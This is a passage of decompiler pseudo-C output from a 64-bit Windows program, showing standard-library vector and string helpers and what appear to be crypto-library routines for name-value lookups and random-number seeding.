  v7[11] = (unsigned int)result;
  return result;
}

//----- (0000000140052F70) ----------------------------------------------------
__int64 __fastcall sub_140052F70(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rax
  __int64 result; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 144i64))();
  result = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v6 + 24i64))(v6, v4, v3);
  *(_BYTE *)(v5 + 184) = *(_BYTE *)(v5 + 184) && !v3;
  return result;
}

//----- (0000000140052FE0) ----------------------------------------------------
char __fastcall sub_140052FE0(_QWORD *a1, unsigned __int64 a2)
{
  char result; // al
  _QWORD *v3; // rbx
  signed __int64 v4; // rdi
  char *v5; // rax

  result = 0;
  v3 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  if ( a2 )
  {
    if ( a2 > 0xAAAAAAAAAAAAAAAi64 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v4 = 24 * a2;
    v5 = (char *)operator new(24 * a2);
    if ( !v5 )
    {
      std::_Xbad_alloc();
      JUMPOUT(*(_QWORD *)&byte_140053057);
    }
    *v3 = v5;
    v3[1] = v5;
    v3[2] = &v5[v4];
    result = 1;
  }
  return result;
}
// 140053057: using guessed type char;
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140053060) ----------------------------------------------------
void __fastcall sub_140053060(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rbx
  void *v5; // rdx
  void *v6; // rdx

  if ( a2 != a3 )
  {
    v3 = a3;
    v4 = a2;
    do
    {
      v5 = *(void **)(v4 + 64);
      memset(*(void **)(v4 + 64), 0, 8i64 * *(_QWORD *)(v4 + 56));
      free(v5);
      v6 = *(void **)(v4 + 24);
      memset(*(void **)(v4 + 24), 0, 8i64 * *(_QWORD *)(v4 + 16));
      free(v6);
      v4 += 80i64;
    }
    while ( v4 != v3 );
  }
}

//----- (00000001400530E0) ----------------------------------------------------
void __fastcall sub_1400530E0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rbx
  void *v5; // rdx
  void *v6; // rdx

  if ( a2 != a3 )
  {
    v3 = a3;
    v4 = a2;
    do
    {
      v5 = *(void **)(v4 + 64);
      memset(*(void **)(v4 + 64), 0, 8i64 * *(_QWORD *)(v4 + 56));
      free(v5);
      v6 = *(void **)(v4 + 24);
      memset(*(void **)(v4 + 24), 0, 8i64 * *(_QWORD *)(v4 + 16));
      free(v6);
      v4 += 96i64;
    }
    while ( v4 != v3 );
  }
}

//----- (0000000140053160) ----------------------------------------------------
void __fastcall sub_140053160(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbp
  __int64 v4; // rdi
  void (__fastcall ***v5)(void *, _QWORD); // rbx
  void (__fastcall ***i)(void *, _QWORD); // rsi

  if ( a2 != a3 )
  {
    v3 = a3;
    v4 = a2;
    do
    {
      v5 = *(void (__fastcall ****)(void *, _QWORD))v4;
      if ( *(_QWORD *)v4 )
      {
        for ( i = *(void (__fastcall ****)(void *, _QWORD))(v4 + 8); v5 != i; v5 += 5 )
          (**v5)(v5, 0i64);
        operator delete(*(void **)v4);
        *(_QWORD *)v4 = 0i64;
        *(_QWORD *)(v4 + 8) = 0i64;
        *(_QWORD *)(v4 + 16) = 0i64;
      }
      v4 += 24i64;
    }
    while ( v4 != v3 );
  }
}

//----- (00000001400531F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400531F0(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  unsigned __int64 v3; // rdx
  unsigned __int64 v4; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v6; // rdx

  v2 = a2;
  v3 = ((unsigned __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)7378697629483820647i64) >> 64) >> 5);
  if ( 230584300921369395i64 - (v3 >> 1) >= v3 )
  {
    v6 = (v3 >> 1) + v3;
    if ( v6 < v2 )
      v6 = v2;
    result = v6;
  }
  else
  {
    v4 = 0i64;
    if ( v2 > 0 )
      v4 = v2;
    result = v4;
  }
  return result;
}

//----- (0000000140053250) ----------------------------------------------------
unsigned __int64 __fastcall sub_140053250(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  unsigned __int64 v3; // rdx
  unsigned __int64 v4; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v6; // rdx

  v2 = a2;
  v3 = ((unsigned __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)7378697629483820647i64) >> 64) >> 4);
  if ( 461168601842738790i64 - (v3 >> 1) >= v3 )
  {
    v6 = (v3 >> 1) + v3;
    if ( v6 < v2 )
      v6 = v2;
    result = v6;
  }
  else
  {
    v4 = 0i64;
    if ( v2 > 0 )
      v4 = v2;
    result = v4;
  }
  return result;
}

//----- (00000001400532B0) ----------------------------------------------------
signed __int64 __fastcall sub_1400532B0(__int64 a1, __int64 a2)
{
  __int64 (__fastcall ***v2)(_QWORD, _QWORD); // rdi
  __int64 v3; // rbp
  signed __int64 result; // rax
  signed __int64 v5; // rsi
  __int64 (__fastcall ***v6)(_QWORD, _QWORD); // rbx

  v2 = *(__int64 (__fastcall ****)(_QWORD, _QWORD))(a1 + 8);
  v3 = a1;
  result = 40 * a2;
  v5 = *(_QWORD *)(a1 + 8) - 40 * a2;
  v6 = (__int64 (__fastcall ***)(_QWORD, _QWORD))v5;
  if ( (__int64 (__fastcall ***)(_QWORD, _QWORD))v5 == v2 )
  {
    *(_QWORD *)(a1 + 8) = v5;
  }
  else
  {
    do
    {
      result = (**v6)(v6, 0i64);
      v6 += 5;
    }
    while ( v6 != v2 );
    *(_QWORD *)(v3 + 8) = v5;
  }
  return result;
}

//----- (0000000140053320) ----------------------------------------------------
signed __int64 __fastcall sub_140053320(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  __int64 *v3; // rsi
  char *v4; // rbx
  unsigned __int64 v5; // rdx
  unsigned __int64 v6; // r14
  signed __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x333333333333333i64 || (v4 = (char *)operator new(80 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  sub_14004D710(*v3, v3[1], (__int64)v4);
  v5 = (unsigned __int128)((v3[1] - *v3) * (signed __int128)7378697629483820647i64) >> 64;
  v6 = (v5 >> 63) + ((signed __int64)v5 >> 5);
  if ( *v3 )
  {
    sub_140053060((__int64)v3, *v3, v3[1]);
    operator delete((void *)*v3);
  }
  v3[2] = (__int64)&v4[80 * v2];
  result = (signed __int64)&v4[80 * v6];
  v3[1] = result;
  *v3 = (__int64)v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140053420) ----------------------------------------------------
signed __int64 __fastcall sub_140053420(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  __int64 *v3; // rsi
  char *v4; // rbx
  unsigned __int64 v5; // rdx
  unsigned __int64 v6; // r14
  signed __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x2AAAAAAAAAAAAAAi64 || (v4 = (char *)operator new(96 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  sub_14004D780(*v3, v3[1], (__int64)v4);
  v5 = (unsigned __int128)((v3[1] - *v3) * (signed __int128)3074457345618258603i64) >> 64;
  v6 = (v5 >> 63) + ((signed __int64)v5 >> 4);
  if ( *v3 )
  {
    sub_1400530E0((__int64)v3, *v3, v3[1]);
    operator delete((void *)*v3);
  }
  v3[2] = (__int64)&v4[96 * v2];
  result = (signed __int64)&v4[96 * v6];
  v3[1] = result;
  *v3 = (__int64)v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140053520) ----------------------------------------------------
signed __int64 __fastcall sub_140053520(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  __int64 *v3; // r14
  char *v4; // rdi
  void (__fastcall ***v5)(_QWORD, _QWORD); // r15
  void (__fastcall ***v6)(_QWORD, _QWORD); // rbx
  unsigned __int64 v7; // rdx
  unsigned __int64 v8; // r12
  signed __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x666666666666666i64 || (v4 = (char *)operator new(40 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  sub_14004D820(*v3, v3[1], (__int64)v4);
  v5 = (void (__fastcall ***)(_QWORD, _QWORD))v3[1];
  v6 = (void (__fastcall ***)(_QWORD, _QWORD))*v3;
  v7 = (unsigned __int128)((v3[1] - *v3) * (signed __int128)7378697629483820647i64) >> 64;
  v8 = (v7 >> 63) + ((signed __int64)v7 >> 4);
  if ( *v3 )
  {
    for ( ; v6 != v5; v6 += 5 )
      (**v6)(v6, 0i64);
    operator delete((void *)*v3);
  }
  v3[2] = (__int64)&v4[40 * v2];
  result = 5 * v8;
  v3[1] = (__int64)&v4[40 * v8];
  *v3 = (__int64)v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140053630) ----------------------------------------------------
__int64 __fastcall sub_140053630(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  __int64 *v3; // rbx
  __int64 v4; // rcx
  signed __int128 v5; // ax
  unsigned __int64 v6; // rdx
  unsigned __int64 v7; // rax

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  v5 = (v3[2] - v4) * (signed __int128)7378697629483820647i64;
  if ( (*((_QWORD *)&v5 + 1) >> 63) + (*((_QWORD *)&v5 + 1) >> 5) < v2 )
  {
    v6 = ((unsigned __int64)((unsigned __int128)((v4 - *v3) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
       + ((signed __int64)((unsigned __int128)((v4 - *v3) * (signed __int128)7378697629483820647i64) >> 64) >> 5);
    if ( 230584300921369395i64 - v6 < v2 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v7 = sub_1400531F0(v3, v2 + v6);
    *(_QWORD *)&v5 = sub_140053320(v3, v7);
  }
  return v5;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (00000001400536D0) ----------------------------------------------------
__int64 __fastcall sub_1400536D0(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  __int64 *v3; // rbx
  __int64 v4; // rcx
  signed __int128 v5; // ax
  unsigned __int64 v6; // rdx
  unsigned __int64 v7; // rax

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  v5 = (v3[2] - v4) * (signed __int128)7378697629483820647i64;
  if ( (*((_QWORD *)&v5 + 1) >> 63) + (*((_QWORD *)&v5 + 1) >> 4) < v2 )
  {
    v6 = ((unsigned __int64)((unsigned __int128)((v4 - *v3) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
       + ((signed __int64)((unsigned __int128)((v4 - *v3) * (signed __int128)7378697629483820647i64) >> 64) >> 4);
    if ( 461168601842738790i64 - v6 < v2 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v7 = sub_140053250(v3, v2 + v6);
    *(_QWORD *)&v5 = sub_140053520(v3, v7);
  }
  return v5;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140053770) ----------------------------------------------------
size_t *__fastcall sub_140053770(size_t *a1, size_t a2, char *a3, size_t a4)
{
  size_t v4; // rdi
  char *v5; // rsi
  size_t v6; // rbp
  size_t *v7; // rbx
  unsigned __int64 v8; // r10
  size_t *v9; // rax
  size_t v10; // rax
  size_t *result; // rax
  size_t v12; // rcx
  size_t v13; // r14
  unsigned __int64 v14; // rax
  size_t v15; // rcx
  size_t v16; // rax
  size_t v17; // rax
  bool v18; // cf
  size_t v19; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !a3 )
    goto LABEL_39;
  v8 = a1[3];
  v9 = v8 < 0x10 ? a1 : *a1;
  if ( a3 < (char *)v9 )
    goto LABEL_39;
  if ( v8 >= 0x10 )
    a1 = (size_t *)*a1;
  if ( (char *)a1 + v7[2] > a3 )
  {
    if ( v8 < 0x10 )
      v10 = (size_t)v7;
    else
      v10 = *v7;
    result = sub_14001E3C0(v7, a2, v7, (unsigned __int64)&a3[-v10], a4);
  }
  else
  {
LABEL_39:
    v12 = v7[2];
    if ( v12 < a2 )
    {
      std::_Xout_of_range("invalid string position");
      __debugbreak();
    }
    if ( -1i64 - v12 <= a4 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    if ( a4 )
    {
      v13 = v12 + a4;
      if ( sub_1400049C0(v7, v12 + a4, 0) )
      {
        v14 = v7[3];
        if ( v14 < 0x10 )
          v15 = (size_t)v7;
        else
          v15 = *v7;
        if ( v14 < 0x10 )
          v16 = (size_t)v7;
        else
          v16 = *v7;
        if ( v7[2] != v6 )
          memmove((void *)(v4 + v16 + v6), (const void *)(v15 + v6), v7[2] - v6);
        if ( v7[3] < 0x10 )
          v17 = (size_t)v7;
        else
          v17 = *v7;
        if ( v4 )
          memcpy((void *)(v17 + v6), v5, v4);
        v18 = v7[3] < 0x10;
        v7[2] = v13;
        if ( v18 )
          v19 = (size_t)v7;
        else
          v19 = *v7;
        *(_BYTE *)(v19 + v13) = 0;
      }
    }
    result = v7;
  }
  return result;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (00000001400539D0) ----------------------------------------------------
void __fastcall sub_1400539D0(__int64 *a1, unsigned __int64 a2)
{
  __int64 v2; // rdi
  __int64 *v3; // rbx
  unsigned __int64 v4; // rcx
  unsigned __int64 v5; // rdi
  unsigned __int64 v6; // rdi
  __int64 v7; // rcx
  __int64 v8; // rcx

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  if ( a2 >= v4 || *v3 > a2 )
  {
    if ( v4 == v3[2] )
      sub_1400536D0(v3, 1ui64);
    v8 = v3[1];
    if ( v8 )
      sub_14003C000(v8, v2);
  }
  else
  {
    v5 = (signed __int64)((unsigned __int128)((signed __int64)(a2 - *v3) * (signed __int128)7378697629483820647i64) >> 64) >> 4;
    v6 = (v5 >> 63) + v5;
    if ( v4 == v3[2] )
      sub_1400536D0(v3, 1ui64);
    v7 = v3[1];
    if ( v7 )
      sub_14003C000(v7, *v3 + 40 * v6);
  }
  v3[1] += 40i64;
}

//----- (0000000140053AA0) ----------------------------------------------------
signed __int64 __fastcall sub_140053AA0(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  __int64 *v3; // rdi
  signed __int64 result; // rax
  unsigned __int64 v5; // r8
  unsigned __int64 v6; // rbx

  v2 = a2;
  v3 = a1;
  result = (unsigned __int64)((unsigned __int128)((a1[1] - *a1) * (signed __int128)7378697629483820647i64) >> 64) >> 63;
  v5 = result
     + ((signed __int64)((unsigned __int128)((a1[1] - *a1) * (signed __int128)7378697629483820647i64) >> 64) >> 4);
  if ( v5 > a2 )
    return sub_1400532B0((__int64)a1, v5 - a2);
  if ( v5 < a2 )
  {
    sub_1400536D0(a1, a2 - v5);
    sub_14004D640(
      (void *)v3[1],
      v2
    - (((unsigned __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)7378697629483820647i64) >> 64) >> 4)));
    v6 = v2
       - (((unsigned __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
        + ((signed __int64)((unsigned __int128)((v3[1] - *v3) * (signed __int128)7378697629483820647i64) >> 64) >> 4));
    result = 5 * v6;
    v3[1] += 40 * v6;
  }
  return result;
}

//----- (0000000140053B90) ----------------------------------------------------
signed __int64 __fastcall sub_140053B90(__int64 *a1, unsigned __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx
  unsigned __int64 v4; // rdi
  __int64 *v5; // rsi
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // rcx
  signed __int64 result; // rax
  unsigned __int64 v9; // r8
  unsigned __int64 v10; // rbx
  unsigned __int64 v11; // rdi

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = a1[1];
  v7 = *a1;
  result = (unsigned __int64)((unsigned __int128)((signed __int64)(v6 - v7) * (signed __int128)7378697629483820647i64) >> 64) >> 63;
  v9 = result
     + ((signed __int64)((unsigned __int128)((signed __int64)(v6 - v7) * (signed __int128)7378697629483820647i64) >> 64) >> 4);
  if ( v9 > a2 )
    return sub_1400532B0((__int64)v5, v9 - a2);
  if ( v9 < a2 )
  {
    if ( v3 >= v6 || v7 > v3 )
    {
      sub_1400536D0(v5, a2 - v9);
    }
    else
    {
      v10 = (signed __int64)((unsigned __int128)((signed __int64)(v3 - v7) * (signed __int128)7378697629483820647i64) >> 64) >> 4;
      sub_1400536D0(v5, a2 - v9);
      v3 = *v5 + 40 * ((v10 >> 63) + v10);
    }
    sub_14004D6A0(
      v5[1],
      v4
    - (((unsigned __int64)((unsigned __int128)((v5[1] - *v5) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
     + ((signed __int64)((unsigned __int128)((v5[1] - *v5) * (signed __int128)7378697629483820647i64) >> 64) >> 4)),
      v3);
    v11 = v4
        - (((unsigned __int64)((unsigned __int128)((v5[1] - *v5) * (signed __int128)7378697629483820647i64) >> 64) >> 63)
         + ((signed __int64)((unsigned __int128)((v5[1] - *v5) * (signed __int128)7378697629483820647i64) >> 64) >> 4));
    result = 5 * v11;
    v5[1] += 40 * v11;
  }
  return result;
}

//----- (0000000140053CE0) ----------------------------------------------------
__int64 __fastcall sub_140053CE0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  void (__fastcall ***v4)(_QWORD, signed __int64); // rcx

  v2 = a1;
  *(_QWORD *)a1 = &off_1400AB338;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_BYTE *)(a1 + 16) = *(_BYTE *)(a2 + 16);
  v3 = *(_QWORD *)(a2 + 8);
  *(_QWORD *)(a2 + 8) = 0i64;
  v4 = *(void (__fastcall ****)(_QWORD, signed __int64))(a1 + 8);
  if ( v4 )
    (**v4)(v4, 1i64);
  *(_QWORD *)(v2 + 8) = v3;
  return v2;
}
// 1400AB338: using guessed type __int64 (__fastcall *off_1400AB338)(void *);

//----- (0000000140053D40) ----------------------------------------------------
__int64 __fastcall sub_140053D40(__int64 a1)
{
  *(_QWORD *)a1 = &off_1400AB338;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_BYTE *)(a1 + 16) = 1;
  return a1;
}
// 1400AB338: using guessed type __int64 (__fastcall *off_1400AB338)(void *);

//----- (0000000140053D60) ----------------------------------------------------
void *__fastcall sub_140053D60(void *a1, char a2)
{
  void *v2; // rbx
  void (__fastcall ***v3)(_QWORD, signed __int64); // rcx
  char v4; // di

  v2 = a1;
  v3 = (void (__fastcall ***)(_QWORD, signed __int64))*((_QWORD *)a1 + 1);
  v4 = a2;
  if ( v3 )
    (**v3)(v3, 1i64);
  if ( v4 & 1 )
    operator delete(v2);
  return v2;
}

//----- (0000000140053DA0) ----------------------------------------------------
signed __int64 __fastcall sub_140053DA0(__int64 a1, const char *a2, __int64 a3, __int64 a4)
{
  const char *v4; // rbx
  __int64 v5; // rbp
  __int64 v6; // rdi
  __int64 v7; // rsi
  int v8; // eax
  __int64 *v9; // rcx
  bool v10; // zf
  __int64 v11; // rax

  v4 = a2;
  v5 = a1;
  v6 = a4;
  v7 = a3;
  v8 = strcmp(a2, "ValueNames");
  v9 = *(__int64 **)(v5 + 8);
  v10 = v8 == 0;
  v11 = *v9;
  if ( v10 )
  {
    if ( (*(unsigned __int8 (__fastcall **)(__int64 *, const char *, __int64, __int64))(v11 + 8))(v9, v4, v7, v6)
      && (*(unsigned __int8 (__fastcall **)(_QWORD, const char *, __int64, __int64))(**(_QWORD **)(v5 + 16) + 8i64))(
           *(_QWORD *)(v5 + 16),
           v4,
           v7,
           v6) )
    {
      return 1i64;
    }
  }
  else if ( (*(unsigned __int8 (__fastcall **)(__int64 *, const char *, __int64, __int64))(v11 + 8))(v9, v4, v7, v6)
         || (*(unsigned __int8 (__fastcall **)(_QWORD, const char *, __int64, __int64))(**(_QWORD **)(v5 + 16) + 8i64))(
              *(_QWORD *)(v5 + 16),
              v4,
              v7,
              v6) )
  {
    return 1i64;
  }
  return 0i64;
}

//----- (0000000140053E40) ----------------------------------------------------
char __fastcall sub_140053E40(__int64 a1, const char *a2, __int64 a3, void *a4)
{
  char *v4; // rdi
  __int64 v5; // rbx
  void *v6; // rbp
  __int64 v7; // rsi
  char *v8; // rax
  int v9; // ecx
  int v10; // edx
  __int64 v12; // rcx
  _BYTE *v13; // rdx
  size_t v14; // r8
  _QWORD *v15; // rax

  v4 = (char *)a2;
  v5 = a1;
  v6 = a4;
  v7 = a3;
  if ( !strcmp(a2, "ValueNames") )
  {
    sub_1400293A0(
      v4,
      (__int64)&std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor',
      v7);
    v12 = *(_QWORD *)(v5 + 24);
    if ( v12 )
      sub_140053E40(v12, v4, v7, v6);
    v13 = *(_BYTE **)(v5 + 8);
    if ( *v13 )
    {
      v14 = -1i64;
      do
        ++v14;
      while ( v13[v14] );
    }
    else
    {
      v14 = 0i64;
    }
    v15 = sub_140004CA0(v6, v13, v14);
    sub_140004CA0(v15, &unk_1400AB2F0, 1ui64);
  }
  else
  {
    while ( 1 )
    {
      v8 = v4;
      do
      {
        v9 = (unsigned __int8)v8[*(_QWORD *)(v5 + 8) - (_QWORD)v4];
        v10 = (unsigned __int8)*v8 - v9;
        if ( (unsigned __int8)*v8 != v9 )
          break;
        ++v8;
      }
      while ( v9 );
      if ( !v10 )
        break;
      v5 = *(_QWORD *)(v5 + 24);
      if ( !v5 )
        return 0;
    }
    (*(void (__fastcall **)(__int64, char *, __int64, void *))(*(_QWORD *)v5 + 8i64))(v5, v4, v7, v6);
    *(_BYTE *)(v5 + 17) = 1;
  }
  return 1;
}
// 1400D8E00: using guessed type void *(__fastcall **std::basic_string<char,std::char_traits<char>,std::allocator<char>> `RTTI Type Descriptor')(type_info *this, unsigned int);

//----- (0000000140053F40) ----------------------------------------------------
char __fastcall sub_140053F40(__int64 a1)
{
  JUMPOUT(*(_QWORD *)(a1 + 8), 0i64, sub_140053E40);
  return 0;
}

//----- (0000000140053F50) ----------------------------------------------------
__int64 sub_140053F50()
{
  return (unsigned int)dword_1400DAB4C;
}
// 1400DAB4C: using guessed type int dword_1400DAB4C;

//----- (0000000140053F60) ----------------------------------------------------
__int64 __fastcall sub_140053F60(__int64 a1)
{
  __int64 v1; // rdi
  signed __int64 v2; // rcx
  signed __int64 v3; // rcx
  _QWORD *v4; // rax
  _QWORD *v5; // rbx

  v1 = a1;
  sub_140036DA0(a1, 1);
  *(_QWORD *)v1 = &off_1400A6728;
  *(_BYTE *)(v1 + 41) = 0;
  *(_QWORD *)(v1 + 48) = 32i64;
  if ( *(_BYTE *)(v1 + 41) )
  {
    v2 = 0i64;
  }
  else
  {
    *(_BYTE *)(v1 + 41) = 1;
    v2 = v1 + 8;
  }
  *(_QWORD *)(v1 + 56) = v2;
  *(_BYTE *)(v1 + 81) = 0;
  *(_QWORD *)(v1 + 88) = 16i64;
  if ( *(_BYTE *)(v1 + 81) )
  {
    v3 = 0i64;
  }
  else
  {
    *(_BYTE *)(v1 + 81) = 1;
    v3 = v1 + 64;
  }
  *(_QWORD *)(v1 + 96) = v3;
  v4 = operator new(0x130ui64);
  v5 = v4;
  if ( v4 )
  {
    sub_14004DE90((__int64)v4);
    *v5 = &off_1400B2EE0;
    v5[1] = off_1400AB2A0;
  }
  else
  {
    v5 = 0i64;
  }
  *(_QWORD *)(v1 + 104) = v5;
  *(_BYTE *)(v1 + 112) = 0;
  memset(*(void **)(v1 + 56), 0, *(_QWORD *)(v1 + 48));
  memset(*(void **)(v1 + 96), 0, *(_QWORD *)(v1 + 88));
  return v1;
}
// 1400A6728: using guessed type __int64 (__fastcall *off_1400A6728)(void *);
// 1400AB2A0: using guessed type __int64 (__fastcall *off_1400AB2A0[2])();
// 1400B2EE0: using guessed type __int64 (__fastcall *off_1400B2EE0)(void *);

//----- (0000000140054040) ----------------------------------------------------
void *__fastcall sub_140054040(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400240F0((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140054070) ----------------------------------------------------
void __fastcall sub_140054070(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rsi
  __int64 v5; // rbp
  __int64 v6; // r14
  __int64 v7; // rdi
  signed int v8; // eax
  __int64 v9; // rbx
  __int64 v10; // [rsp+20h] [rbp-48h]
  __int64 v11; // [rsp+28h] [rbp-40h]
  __int64 (__fastcall **v12)(); // [rsp+30h] [rbp-38h]
  __int64 v13; // [rsp+38h] [rbp-30h]
  __int64 v14; // [rsp+40h] [rbp-28h]
  __int64 v15; // [rsp+48h] [rbp-20h]

  if ( a4 )
  {
    v4 = a4;
    v5 = a3;
    v6 = a2;
    v7 = a1;
    if ( !*(_BYTE *)(a1 + 112) )
      (*(void (__fastcall **)(_QWORD, _QWORD, signed __int64, __int64))(**(_QWORD **)(a1 + 104) + 48i64))(
        *(_QWORD *)(a1 + 104),
        *(_QWORD *)(a1 + 56),
        32i64,
        qword_1400DA7A8);
    v12 = &off_1400AB398;
    LODWORD(v13) = 0;
    WORD2(v13) = 0;
    v14 = 0i64;
    v15 = 0i64;
    **(_QWORD **)(v7 + 96) += sub_140067D70().QuadPart;
    *(_QWORD *)(*(_QWORD *)(v7 + 96) + 8i64) += time64(0i64);
    do
    {
      (*(void (__fastcall **)(signed __int64, _QWORD, _QWORD, _QWORD))(*(_QWORD *)(*(_QWORD *)(v7 + 104) + 8i64) + 24i64))(
        *(_QWORD *)(v7 + 104) + 8i64,
        *(_QWORD *)(v7 + 96),
        0i64,
        *(_QWORD *)(v7 + 96));
      v8 = 16;
      if ( v4 < 0x10 )
        v8 = v4;
      LOBYTE(v11) = 1;
      LODWORD(v10) = 0;
      v9 = v8;
      (*(void (__fastcall **)(__int64, __int64, _QWORD, _QWORD, __int64, __int64, __int64 (__fastcall **)(), __int64, __int64, __int64))(*(_QWORD *)v6 + 272i64))(
        v6,
        v5,
        *(_QWORD *)(v7 + 96),
        v8,
        v10,
        v11,
        v12,
        v13,
        v14,
        v15);
      v4 -= v9;
    }
    while ( v4 );
  }
}
// 1400AB398: using guessed type __int64 (__fastcall *off_1400AB398)();
// 1400DA7A8: using guessed type __int64 qword_1400DA7A8;

//----- (0000000140054190) ----------------------------------------------------
char *__fastcall sub_140054190(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  __int64 v5; // rbp
  int v6; // esp
  __int64 v7; // rax
  char *v8; // rsi
  __int64 v9; // rdi
  __int64 (__fastcall **v10)(void *); // rbx
  unsigned int v11; // eax
  char *v12; // rdi
  __int64 i; // rcx
  char *result; // rax
  char *v15; // rdi
  __int64 j; // rcx
  __int64 (__fastcall **v17)(void *); // [rsp+28h] [rbp-F0h]
  __int64 v18; // [rsp+30h] [rbp-E8h]
  char v19; // [rsp+38h] [rbp-E0h]
  char v20; // [rsp+79h] [rbp-9Fh]
  __int64 v21; // [rsp+80h] [rbp-98h]
  char *v22; // [rsp+88h] [rbp-90h]
  char v23[73]; // [rsp+90h] [rbp-88h]
  char v24; // [rsp+D9h] [rbp-3Fh]
  __int64 v25; // [rsp+E0h] [rbp-38h]
  char *v26; // [rsp+E8h] [rbp-30h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  sub_140036DA0((__int64)&v17, 1);
  v18 = 0i64;
  v21 = 16i64;
  v20 = 1;
  v22 = &v19;
  v25 = 16i64;
  v24 = 1;
  v7 = -(v6 + 144) & 0xF;
  v8 = &v23[v7];
  v26 = &v23[v7];
  sub_140061C80(&v23[v7]);
  v17 = &off_1400AAF88;
  sub_1400619E0(&v17, *(_QWORD *)(v5 + 56), 32i64);
  sub_1400619E0(&v17, v4, v3);
  v9 = *(_QWORD *)(v5 + 56);
  v10 = v17;
  v11 = v17[7](&v17);
  ((void (__fastcall *)(__int64 (__fastcall ***)(void *), __int64, _QWORD))v10[14])(&v17, v9, v11);
  *(_BYTE *)(v5 + 112) = 0;
  v12 = v26;
  if ( v26 == v8 )
  {
    for ( i = v25; i; --i )
    {
      *(_DWORD *)v12 = 0;
      v12 += 4;
    }
  }
  result = &v19;
  v15 = v22;
  if ( v22 == &v19 )
  {
    result = 0i64;
    for ( j = v21; j; --j )
    {
      *(_DWORD *)v15 = 0;
      v15 += 4;
    }
  }
  return result;
}
// 1400619E0: using guessed type __int64 __fastcall sub_1400619E0(_QWORD, _QWORD, _QWORD);
// 1400AAF88: using guessed type __int64 (__fastcall *off_1400AAF88)(void *);
